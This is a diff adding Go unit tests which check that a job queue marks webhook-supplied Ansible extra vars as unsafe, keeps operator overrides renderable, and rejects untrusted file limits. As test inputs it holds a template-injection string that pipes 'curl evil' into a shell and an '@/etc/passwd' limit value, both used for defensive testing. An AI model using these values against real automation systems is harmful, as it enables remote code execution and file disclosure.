@@ -159,3 +159,81 @@ func TestMergeExtraVars(t *testing.T) {
 		t.Fatalf("null base = %s, %v", got, err)
 	}
 }
+
+// TestBuildPayloadMarksUntrustedOverridesUnsafe is final review C1: values
+// a webhook payload supplied reach the worker marked unsafe for Ansible, at
+// every depth, so "{{ lookup('pipe', …) }}" stays literal text; the
+// template's own values stay as they are, and a template secret is still
+// redacted.
+func TestBuildPayloadMarksUntrustedOverridesUnsafe(t *testing.T) {
+	org, zone, templateID := uuid.Must(uuid.NewV7()), uuid.Must(uuid.NewV7()), uuid.Must(uuid.NewV7())
+	schemaRaw := json.RawMessage(`{"fields":[{"name":"token","type":"secret"},{"name":"branch","type":"string"},{"name":"tags","type":"list","item":{"name":"tag","type":"string"}},{"name":"replicas","type":"int"}]}`)
+	templates := fakeTemplates{byID: map[uuid.UUID]TemplateRow{templateID: {
+		ID: templateID, OrgID: org, PlaybookInline: "- hosts: all\n",
+		Limit: "all", ExtraVars: json.RawMessage(`{"branch":"{{ template_default }}","token":"template-secret-4c1"}`), ExtraVarsSchema: schemaRaw,
+	}}}
+	q := newTestQueue(fakeRenderer{inv: render.Inventory{Doc: map[string]any{}}}, fakeCreds{}, templates, fakeBastions{})
+	q.SetKeyPins(fakePins{})
+	job := Job{ID: uuid.Must(uuid.NewV7()), OrgID: org, ZoneID: zone, Kind: KindRun, TemplateID: &templateID, HostIDs: testHosts}
+	inject := "{{ lookup('pipe', 'curl evil|sh') }}"
+	job.Payload = sealedOverride(t, q, job, RunOverrides{Untrusted: true, ExtraVars: map[string]any{
+		"branch": inject, "tags": []any{"v1", "{% raw %}x"}, "replicas": float64(2),
+	}})
+
+	out := &workerpb.Job{}
+	if err := q.buildPayload(context.Background(), job, out); err != nil {
+		t.Fatalf("buildPayload: %v", err)
+	}
+	wantBranch, _ := json.Marshal(map[string]string{"__ansible_unsafe": inject})
+	if out.ExtraVars["branch"] != string(wantBranch) {
+		t.Fatalf("branch = %s, want %s", out.ExtraVars["branch"], wantBranch)
+	}
+	if out.ExtraVars["tags"] != `[{"__ansible_unsafe":"v1"},{"__ansible_unsafe":"{% raw %}x"}]` {
+		t.Fatalf("tags = %s", out.ExtraVars["tags"])
+	}
+	if out.ExtraVars["replicas"] != "2" {
+		t.Fatalf("replicas = %s", out.ExtraVars["replicas"])
+	}
+	// The template's own values are the operator's and keep templating.
+	if out.ExtraVars["token"] != `"template-secret-4c1"` {
+		t.Fatalf("token = %s", out.ExtraVars["token"])
+	}
+	if !strings.Contains(strings.Join(out.Redact, "\n"), "template-secret-4c1") {
+		t.Fatalf("the template's secret must stay redacted: %v", out.Redact)
+	}
+}
+
+// TestBuildPayloadKeepsTrustedOverridesRenderable: a schedule's overrides
+// come from an operator (spec §14) and keep Ansible's templating.
+func TestBuildPayloadKeepsTrustedOverridesRenderable(t *testing.T) {
+	org, templateID := uuid.Must(uuid.NewV7()), uuid.Must(uuid.NewV7())
+	templates := fakeTemplates{byID: map[uuid.UUID]TemplateRow{templateID: {ID: templateID, OrgID: org, PlaybookInline: "- hosts: all\n"}}}
+	q := newTestQueue(fakeRenderer{inv: render.Inventory{Doc: map[string]any{}}}, fakeCreds{}, templates, fakeBastions{})
+	q.SetKeyPins(fakePins{})
+	job := Job{ID: uuid.Must(uuid.NewV7()), OrgID: org, ZoneID: uuid.Must(uuid.NewV7()), Kind: KindRun, TemplateID: &templateID, HostIDs: testHosts}
+	job.Payload = sealedOverride(t, q, job, RunOverrides{ExtraVars: map[string]any{"when": "{{ ansible_date_time.date }}"}})
+	out := &workerpb.Job{}
+	if err := q.buildPayload(context.Background(), job, out); err != nil {
+		t.Fatalf("buildPayload: %v", err)
+	}
+	if out.ExtraVars["when"] != `"{{ ansible_date_time.date }}"` {
+		t.Fatalf("when = %s", out.ExtraVars["when"])
+	}
+}
+
+// TestBuildPayloadRefusesUntrustedFileLimit: the claim re-checks an
+// untrusted limit, so a payload that bypassed the receive-time check still
+// cannot make Ansible read a file on the worker.
+func TestBuildPayloadRefusesUntrustedFileLimit(t *testing.T) {
+	org, templateID := uuid.Must(uuid.NewV7()), uuid.Must(uuid.NewV7())
+	templates := fakeTemplates{byID: map[uuid.UUID]TemplateRow{templateID: {ID: templateID, OrgID: org, PlaybookInline: "- hosts: all\n"}}}
+	q := newTestQueue(fakeRenderer{inv: render.Inventory{Doc: map[string]any{}}}, fakeCreds{}, templates, fakeBastions{})
+	q.SetKeyPins(fakePins{})
+	job := Job{ID: uuid.Must(uuid.NewV7()), OrgID: org, ZoneID: uuid.Must(uuid.NewV7()), Kind: KindRun, TemplateID: &templateID, HostIDs: testHosts}
+	limit := "@/etc/passwd"
+	job.Payload = sealedOverride(t, q, job, RunOverrides{Untrusted: true, Limit: &limit})
+	err := q.buildPayload(context.Background(), job, &workerpb.Job{})
+	if err == nil || strings.Contains(err.Error(), limit) {
+		t.Fatalf("an untrusted file limit must fail the claim without echoing it: %v", err)
+	}
+}
